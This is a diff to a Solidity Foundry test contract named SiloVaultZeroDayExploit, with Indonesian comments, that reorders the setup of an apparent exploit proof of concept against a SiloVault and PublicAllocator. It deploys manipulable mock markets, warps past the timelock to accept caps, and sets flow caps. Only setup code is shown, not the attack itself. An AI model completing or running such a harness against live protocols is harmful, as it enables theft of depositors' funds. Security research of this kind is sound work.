@@ -50,34 +50,40 @@ contract SiloVaultZeroDayExploit is Test {
         targetMarket = new ManipulatableMarket(usdc);
         idleMarket = new ManipulatableMarket(usdc);
 
-        // MOCK INCENTIVES MODULE MENGGUNAKAN VM.MOCKCALL (Bypass Error Abstract)
+        // MOCK INCENTIVES MODULE
         address mockIncentives = address(0x999);
         vm.mockCall(mockIncentives, abi.encodeWithSignature("getNotificationReceivers()"), abi.encode(new address[](0)));
         vm.mockCall(mockIncentives, abi.encodeWithSignature("getAllIncentivesClaimingLogics()"), abi.encode(new address[](0)));
 
-        // DEPLOY KONTRAK SILOVAULT ASLI
+        // DEPLOY KONTRAK ASLI
         vault = new SiloVault(admin, 86400, IVaultIncentivesModule(mockIncentives), address(usdc), "Silo Vault", "sUSDC");
-
-        // DEPLOY KONTRAK ALLOCATOR ASLI
         allocator = new PublicAllocator();
 
         // SET UP PERIZINAN
         vm.startPrank(admin);
         vault.setIsAllocator(address(allocator), true);
-        allocator.setAdmin(ISiloVault(address(vault)), admin); // EXPLICIT CASTING
+        allocator.setAdmin(ISiloVault(address(vault)), admin); 
 
-        // Atur Flow Caps: maxOut untuk targetMarket HANYA 10,000 USDC
+        // 1. DAFTARKAN MARKET (Akan masuk status Pending karena Timelock)
+        vault.submitCap(IERC4626(address(targetMarket)), type(uint184).max);
+        vault.submitCap(IERC4626(address(idleMarket)), type(uint184).max);
+
+        // 2. FAST-FORWARD WAKTU 1 HARI (86400 detik)
+        vm.warp(block.timestamp + 86400);
+
+        // 3. TERIMA MARKET (Sekarang Market resmi aktif/enabled)
+        vault.acceptCap(IERC4626(address(targetMarket)));
+        vault.acceptCap(IERC4626(address(idleMarket)));
+
+        // 4. ATUR FLOW CAPS (Sekarang berhasil karena market sudah aktif)
         FlowCapsConfig[] memory configs = new FlowCapsConfig[](1);
         configs[0] = FlowCapsConfig({
-            market: IERC4626(address(targetMarket)), // EXPLICIT CASTING
+            market: IERC4626(address(targetMarket)),
             caps: FlowCaps({maxIn: type(uint128).max, maxOut: 10_000 * 1e6})
         });
         allocator.setFlowCaps(ISiloVault(address(vault)), configs);
 
-        // Daftarkan Market ke dalam Silo Vault
-        vault.submitCap(IERC4626(address(targetMarket)), type(uint184).max);
-        vault.submitCap(IERC4626(address(idleMarket)), type(uint184).max);
-
+        // 5. ATUR ANTREAN SUPLAI
         IERC4626[] memory queue = new IERC4626[](2);
         queue[0] = IERC4626(address(targetMarket));
         queue[1] = IERC4626(address(idleMarket));
